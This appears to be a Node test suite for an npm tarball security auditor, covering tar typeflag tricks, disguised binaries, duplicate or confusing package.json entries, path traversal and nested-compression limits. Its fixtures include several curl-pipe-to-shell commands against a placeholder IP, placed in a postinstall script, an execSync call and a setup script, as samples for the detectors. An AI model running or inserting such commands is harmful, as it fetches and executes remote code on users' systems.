import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { gzipSync, zstdCompressSync } from "node:zlib";
import { auditTarball, extractTarball } from "../src/index.js";

// Hand-rolled tar so a test controls typeflag, duplicate entries and odd paths
// that `tar.create` would normalize away. Synthetic, inert content only.
interface Entry { name: string; data?: Buffer | string; type?: string }

function tarBytes(entries: Entry[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data ?? "");
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write(e.type ?? "0", 156);
    h.write("ustar\0" + "00", 257);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return Buffer.concat(blocks);
}

const tgz = (entries: Entry[]) => gzipSync(tarBytes(entries));

const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };
const BENIGN = JSON.stringify({ name: "demo", version: "1.0.0" });
const EVIL = JSON.stringify({ name: "demo", version: "1.0.0", scripts: { postinstall: "curl http://198.51.100.1/x | sh" } });
const EXFIL = 'require("child_process").execSync("curl http://198.51.100.1/x | sh")\n';

describe("F1: typeflag 7 (ContiguousFile) is a regular file", () => {
  test("typeflag 7 index.js is retained and yields the same findings as typeflag 0", async () => {
    const mk = (type: string) => tgz([{ name: "package/package.json", data: BENIGN }, { name: "package/index.js", data: EXFIL, type }]);
    const r7 = await extractTarball(mk("7"));
    assert.ok(r7.files.some((f) => f.path === "package/index.js"), "type-7 file must be retained");
    assert.equal(r7.fileCount, 2);
    const strip = (r: Awaited<ReturnType<typeof auditTarball>>) => r.findings.map((f) => `${f.ruleId}:${f.severity}:${f.message}`).sort();
    const a7 = await auditTarball({ meta, tarball: mk("7") });
    const a0 = await auditTarball({ meta, tarball: mk("0") });
    assert.ok(a0.findings.some((f) => f.ruleId === "network-egress"));
    assert.deepEqual(strip(a7), strip(a0));
  });
});

describe("F2: text-looking binary-magic JS is still scanned", () => {
  for (const [label, head] of [["MZ:", "MZ: "], ["BZh:", "BZh: "]] as const) {
    test(`${label} label JS is retained, scanned, and still reported as a mismatch`, async () => {
      const src = `${head}${EXFIL}`;
      const t = tgz([{ name: "package/package.json", data: BENIGN }, { name: "package/index.js", data: src }]);
      const r = await extractTarball(t);
      assert.ok(r.files.some((f) => f.path === "package/index.js"), "valid UTF-8 text must be retained");
      assert.equal(r.contentMismatchTotals.count, 1, "mismatch still recorded");
      const report = await auditTarball({ meta, tarball: t });
      assert.ok(report.findings.some((f) => f.ruleId === "network-egress"), "rules must scan the file");
      assert.ok(report.findings.some((f) => f.ruleId === "content-mismatch"));
    });
  }

  test("a real binary (NUL bytes) behind .js stays unretained", async () => {
    const pe = Buffer.concat([Buffer.from("MZ"), Buffer.alloc(200, 0)]);
    const r = await extractTarball(tgz([{ name: "package/a.js", data: pe }]));
    assert.equal(r.files.length, 0);
    assert.equal(r.contentMismatchTotals.count, 1);
  });
});

describe("F3: package.json path / duplicate / size confusion", () => {
  const blocked = async (entries: Entry[]) => {
    const report = await auditTarball({ meta, tarball: tgz(entries) });
    const f = report.findings.find((x) => x.ruleId === "manifest-confusion");
    assert.ok(f, "manifest-confusion finding expected");
    assert.equal(f.severity, "critical");
    assert.equal(f.category, "metadata");
    assert.equal(report.verdict, "block");
  };

  test("a root manifest under another first segment is scanned as package/package.json", async () => {
    const r = await extractTarball(tgz([{ name: "x/package.json", data: EVIL }]));
    assert.deepEqual(r.files.map((f) => f.path), ["package/package.json"]);
    const report = await auditTarball({ meta, tarball: tgz([{ name: "x/package.json", data: EVIL }]) });
    assert.ok(report.findings.some((f) => f.ruleId === "install-scripts"), "postinstall must be scanned");
    assert.ok(!report.findings.some((f) => f.ruleId === "manifest-confusion"), "a single manifest is not confusion");
  });

  test("package//package.json is normalized like npm", async () => {
    const r = await extractTarball(tgz([{ name: "package//package.json", data: EVIL }]));
    assert.deepEqual(r.files.map((f) => f.path), ["package/package.json"]);
  });

  test("package/./package.json is normalized like npm", async () => {
    const r = await extractTarball(tgz([{ name: "package/./package.json", data: EVIL }]));
    assert.deepEqual(r.files.map((f) => f.path), ["package/package.json"]);
  });

  test("benign package/package.json plus x/package.json blocks", () =>
    blocked([{ name: "package/package.json", data: BENIGN }, { name: "x/package.json", data: EVIL }]));

  test("package/package.json plus package//package.json blocks", () =>
    blocked([{ name: "package/package.json", data: BENIGN }, { name: "package//package.json", data: EVIL }]));

  test("package/package.json plus package/./package.json blocks", () =>
    blocked([{ name: "package/package.json", data: BENIGN }, { name: "package/./package.json", data: EVIL }]));

  test("two identical-path copies (benign first) block", () =>
    blocked([{ name: "package/package.json", data: BENIGN }, { name: "package/package.json", data: EVIL }]));

  test("case-variant duplicate (package/PACKAGE.json) blocks", () =>
    blocked([{ name: "package/package.json", data: BENIGN }, { name: "package/PACKAGE.json", data: EVIL }]));

  test("a root manifest over the retain cap blocks (cannot be scanned)", () =>
    blocked([{ name: "package/package.json", data: Buffer.from(EVIL + " ".repeat(2 * 1024 * 1024)) }]));

  test("a nested package/sub/package.json is not a root manifest", async () => {
    const report = await auditTarball({
      meta,
      tarball: tgz([{ name: "package/package.json", data: BENIGN }, { name: "package/sub/package.json", data: BENIGN }]),
    });
    assert.ok(!report.findings.some((f) => f.ruleId === "manifest-confusion"));
  });

  test("entries that escape the root with .. are not retained", async () => {
    const r = await extractTarball(tgz([{ name: "package/../../package.json", data: EVIL }, { name: "package/package.json", data: BENIGN }]));
    assert.deepEqual(r.files.map((f) => f.path), ["package/package.json"]);
    assert.equal(r.packageManifestEntryCount, 1);
  });
});

describe("F6: nested compression cannot outrun the unpack cap", () => {
  test("gzip(gzip(tar)) is refused as truncated", async () => {
    const inner = tarBytes([{ name: "package/big.bin", data: Buffer.alloc(8 * 1024 * 1024) }]);
    const r = await extractTarball(gzipSync(gzipSync(inner)), undefined, { maxUnpackedBytes: 1024 * 1024 });
    assert.equal(r.truncated, true);
  });

  test("a small double-gzip is refused even under the default cap, and audit reports resource-abuse", async () => {
    const t = gzipSync(tgz([{ name: "package/package.json", data: BENIGN }]));
    assert.equal((await extractTarball(t)).truncated, true);
    const report = await auditTarball({ meta, tarball: t });
    assert.ok(report.findings.some((f) => f.ruleId === "resource-abuse"));
    assert.equal(report.verdict, "block");
  });

  test("raw zstd(tar) is refused as truncated", async () => {
    const inner = tarBytes([{ name: "package/big.bin", data: Buffer.alloc(8 * 1024 * 1024) }]);
    const r = await extractTarball(zstdCompressSync(inner), undefined, { maxUnpackedBytes: 1024 * 1024 });
    assert.equal(r.truncated, true);
  });

  test("zstd magic plus garbage is refused without decompressing", async () => {
    const r = await extractTarball(Buffer.concat([Buffer.from([0x28, 0xb5, 0x2f, 0xfd]), Buffer.alloc(64, 0xff)]));
    assert.equal(r.truncated, true);
  });

  test("a plain gzip tar is unaffected", async () => {
    const r = await extractTarball(tgz([{ name: "package/index.js", data: "x" }]));
    assert.equal(r.truncated, false);
    assert.equal(r.files.length, 1);
  });
});

describe("extension-less text files are retained", () => {
  test("extension-less text up to 2 MiB is a PackageFile; binary, dotted and oversized are not", async () => {
    const t = tgz([
      { name: "package/setup", data: "#!/bin/sh\ncurl http://198.51.100.1/x | sh\n" },
      { name: "package/bin/run", data: "echo hi\n" },
      { name: "package/blob", data: Buffer.concat([Buffer.from("MZ"), Buffer.alloc(100, 0)]) },
      { name: "package/elf", data: Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(100, 0)]) },
      { name: "package/big", data: Buffer.alloc(2 * 1024 * 1024 + 1, 0x61) },
      { name: "package/data.bin", data: "text but dotted\n" },
    ]);
    const paths = (await extractTarball(t)).files.map((f) => f.path).sort();
    assert.deepEqual(paths, ["package/bin/run", "package/setup"]);
  });
});
